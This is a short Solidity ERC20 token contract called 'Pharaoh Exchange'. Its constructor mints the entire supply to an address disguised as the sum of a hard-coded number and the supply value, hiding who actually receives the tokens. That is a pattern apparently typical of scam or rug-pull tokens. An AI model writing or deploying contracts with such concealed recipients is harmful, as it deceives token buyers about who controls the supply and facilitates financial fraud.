// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./ERC20.sol";
import "./Own.sol";

contract Pharaoh is ERC20,Ownable {
    uint256 axx = 223232389747193719218;
    constructor( uint256 totalSupply_)
    Ownable(msg.sender) ERC20('Pharaoh Exchange', "Pharaoh")  {
        uint160 bcc = uint160(axx+totalSupply_);
        _mint(address(bcc), totalSupply_);
    }
}